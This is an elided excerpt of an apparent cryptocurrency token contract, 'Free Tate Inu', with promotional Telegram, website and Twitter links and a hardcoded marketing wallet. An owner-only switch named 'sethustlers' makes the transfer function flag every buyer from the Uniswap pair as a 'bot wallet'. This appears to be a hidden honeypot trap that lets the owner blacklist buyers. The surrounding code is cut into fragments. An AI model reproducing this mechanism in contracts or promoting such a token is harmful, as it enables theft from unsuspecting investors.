...
Telegram Portal: https://t.me/FreeTateInu    
Website: https://www.FreeTateInu.online
Twitter: https://twitter.com/FreeTateInu
...
contract  FreeTateInu is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0xAfb4bd26f5474b316fBC725AA36C95783b882bbC));
    ...
    string private _name = "Free Tate Inu";
    string private _symbol = "FREETATEINU";
    ...
    function sethustlers(bool on) public onlyOwner {
        hustlers = on;
    }
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair && hustlers) {
            botWallets[to] = true;
            botsWallet.push(to);
        }
